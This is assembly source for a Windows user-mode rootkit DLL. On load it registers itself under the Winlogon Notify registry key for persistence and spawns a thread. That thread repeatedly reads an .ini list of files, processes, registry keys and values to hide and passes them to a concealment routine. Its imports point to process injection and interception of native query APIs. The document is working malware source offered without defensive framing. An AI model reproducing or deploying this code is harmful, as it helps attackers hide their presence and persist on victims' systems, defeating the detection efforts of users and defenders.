format PE GUI 4.0 DLL

include 'win32a.inc'

section '.text' code readable writeable executable

include 'micrork.inc'

sectName  db 'settings', 0
hdflsName db 'HiddenFiles', 0
hdprcName db 'HiddenProcesses', 0
hdrgkName db 'HiddenRegKeys', 0
hdrvlName db 'HiddenRegValues', 0
trprName  db 'TrueProcesses', 0

regPath   db 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify', 0
nameStr   db 'DllName', 0
strtStr   db 'Startup', 0
ascrStr   db 'Asynchronous', 0
imprStr   db 'Impersonate', 0

LoadConfigThread:
  push	  ebp
  mov	  ebp, esp
  sub	  esp, 600h
  push	  edi
  lea	  edi, [ebp-600h]
  xor	  eax, eax
  mov	  ecx, 600h / 4
  rep stosd
  lea	  edi, [ebp-100h]
  push	  100h
  push	  edi
  push	  dword [ebp+8]
  call	  [GetModuleFileName]
  push	  edi
  call	  SetAutorun
  add	  edi, 100h
@@:
  dec	  edi
  cmp	  byte [edi], '.'
  jnz	  @B
  mov	  dword [edi], '.ini'
  lea	  edi, [ebp-100h]
@@:
  push	  edi
  push	  100h
  lea	  eax, [ebp-200h]
  push	  eax
  push	  0
  push	  hdflsName
  push	  sectName
  call	  [GetPrivateProfileString]
  test	  eax, eax
  jz	  @F
  push	  edi
  push	  100h
  lea	  eax, [ebp-300h]
  push	  eax
  push	  0
  push	  hdprcName
  push	  sectName
  call	  [GetPrivateProfileString]
  test	  eax, eax
  jz	  @F
  push	  edi
  push	  100h
  lea	  eax, [ebp-400h]
  push	  eax
  push	  0
  push	  hdrgkName
  push	  sectName
  call	  [GetPrivateProfileString]
  test	  eax, eax
  jz	  @F
  push	  edi
  push	  100h
  lea	  eax, [ebp-500h]
  push	  eax
  push	  0
  push	  hdrvlName
  push	  sectName
  call	  [GetPrivateProfileString]
  test	  eax, eax
  jz	  @F
  push	  edi
  push	  100h
  lea	  eax, [ebp-600h]
  push	  eax
  push	  0
  push	  trprName
  push	  sectName
  call	  [GetPrivateProfileString]
  test	  eax, eax
  jz	  @F
  lea	  eax, [ebp-600h]
  push	  eax
  lea	  eax, [ebp-500h]
  push	  eax
  lea	  eax, [ebp-400h]
  push	  eax
  lea	  eax, [ebp-300h]
  push	  eax
  lea	  eax, [ebp-200h]
  push	  eax
  call	  SetHidden
  push	  5000
  call	  [Sleep]
  jmp	  @B
@@:
  pop	  edi
  leave
  retn	  0Ch

SetAutorun:
  push	  ebp
  mov	  ebp, esp
  sub	  esp, 0Ch
  push	  esi
  lea	  eax, [ebp-4]
  push	  eax
  push	  regPath
  push	  HKEY_LOCAL_MACHINE
  call	  [RegOpenKey]
  test	  eax, eax
  jnz	  aExit
  mov	  eax, [ebp+8]
  add	  eax, 100h
@@:
  dec	  eax
  cmp	  byte [eax-1], '\'
  jnz	  @B
  lea	  ebx, [ebp-8]
  push	  ebx
  push	  eax
  push	  dword [ebp-4]
  call	  [RegCreateKey]
  test	  eax, eax
  jnz	  @F
  push	  dword [ebp+8]
  call	  [lstrlen]
  push	  eax
  push	  dword [ebp+8]
  push	  REG_SZ
  push	  0
  push	  nameStr
  push	  dword [ebp-8]
  call	  [RegSetValueEx]
  push	  7
  push	  strtStr
  push	  REG_SZ
  push	  0
  push	  strtStr
  push	  dword [ebp-8]
  call	  [RegSetValueEx]
  lea	  esi, [ebp-0Ch]
  mov	  dword [esi], 1
  push	  4
  push	  esi
  push	  REG_DWORD
  push	  0
  push	  ascrStr
  push	  dword [ebp-8]
  call	  [RegSetValueEx]
  mov	  dword [esi], 0
  push	  4
  push	  esi
  push	  REG_DWORD
  push	  0
  push	  imprStr
  push	  dword [ebp-8]
  call	  [RegSetValueEx]
  push	  dword [ebp-8]
  call	  [RegCloseKey]
@@:
  push	  dword [ebp-4]
  call	  [RegCloseKey]
aExit:
  pop	  esi
  leave
  retn	  4

entry $
  push	  ebp
  mov	  ebp, esp
  cmp	  dword [ebp+0Ch], DLL_PROCESS_ATTACH
  jnz	  @F
  call	  InitRootkit
  push	  0
  push	  0
  push	  dword [ebp+8]
  push	  LoadConfigThread
  push	  0
  push	  0
  call	  [CreateThread]
  test	  eax, eax
  jz	  @F
  push	  eax
  call	  [CloseHandle]
@@:
  leave
  ret	  0Ch


section '.idata' import data readable writeable

  library kernel32, 'kernel32.dll',\
	  advapi32, 'advapi32.dll',\
	  ntdll,    'ntdll.dll'

  import kernel32,					     \
       VirtualAllocEx,		 'VirtualAllocEx',	     \
       DuplicateHandle, 	 'DuplicateHandle',	     \
       WriteProcessMemory,	 'WriteProcessMemory',	     \
       CreateRemoteThread,	 'CreateRemoteThread',	     \
       CreateToolhelp32Snapshot, 'CreateToolhelp32Snapshot', \
       Process32First,		 'Process32First',	     \
       Process32Next,		 'Process32Next',	     \
       OpenProcess,		 'OpenProcess', 	     \
       CloseHandle,		 'CloseHandle', 	     \
       VirtualProtect,		 'VirtualProtect',	     \
       MapViewOfFile,		 'MapViewOfFile',	     \
       ReadProcessMemory,	 'ReadProcessMemory',	     \
       GetModuleFileNameW,	 'GetModuleFileNameW',	     \
       CreateFileMapping,	 'CreateFileMappingA',	     \
       CreateThread,		 'CreateThread',	     \
       GetModuleFileName,	 'GetModuleFileNameA',	     \
       GetPrivateProfileString,  'GetPrivateProfileStringA', \
       Sleep,			 'Sleep',		     \
       lstrlen, 		 'lstrlen'

  import advapi32,					     \
       OpenProcessToken,	 'OpenProcessToken',	     \
       LookupPrivilegeValue,	 'LookupPrivilegeValueA',    \
       AdjustTokenPrivileges,	 'AdjustTokenPrivileges',    \
       RegOpenKey,		 'RegOpenKeyA', 	     \
       RegCloseKey,		 'RegCloseKey', 	     \
       RegCreateKey,		 'RegCreateKeyA',	     \
       RegSetValueEx,		 'RegSetValueExA'

  import ntdll, 					     \
       ZwQueryDirectoryFile,	 'ZwQueryDirectoryFile',     \
       wcsnicmp,		 '_wcsnicmp',		     \
       wcscpy,			 'wcscpy',		     \
       ZwQuerySystemInformation, 'ZwQuerySystemInformation', \
       ZwEnumerateValueKey,	 'ZwEnumerateValueKey',      \
       wcsncpy, 		 'wcsncpy',		     \
       ZwClose, 		 'ZwClose',		     \
       ZwOpenKey,		 'ZwOpenKey',		     \
       ZwEnumerateKey,		 'ZwEnumerateKey',	     \
       RtlInitUnicodeString,	 'RtlInitUnicodeString',     \
       wcsicmp, 		 '_wcsicmp',		     \
       mbstowcs,		 'mbstowcs',		     \
       ZwCreateThread,		 'ZwCreateThread'

section '.reloc' fixups data discardable